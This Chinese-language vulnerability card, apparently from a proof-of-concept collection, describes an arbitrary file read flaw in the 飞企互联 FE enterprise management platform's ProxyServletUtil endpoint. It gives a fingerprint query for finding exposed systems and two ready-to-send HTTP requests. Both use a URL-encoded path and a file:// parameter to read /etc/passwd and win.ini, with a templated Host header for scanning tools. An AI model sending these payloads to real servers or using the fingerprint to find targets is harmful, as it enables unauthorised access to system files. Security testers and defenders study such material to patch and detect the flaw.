# 飞企FE-ProxyServletUti任意文件读取漏洞

- **系统**：飞企FE-ProxyServletUti　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="飞企互联-FE企业运营管理平台"`
- **请求**：`GET /ProxyServletUti%6c?url=file:///etc/passwd HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`

**请求体 / payload**
```
GET /ProxyServletUti%6c?url=file:///c:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
```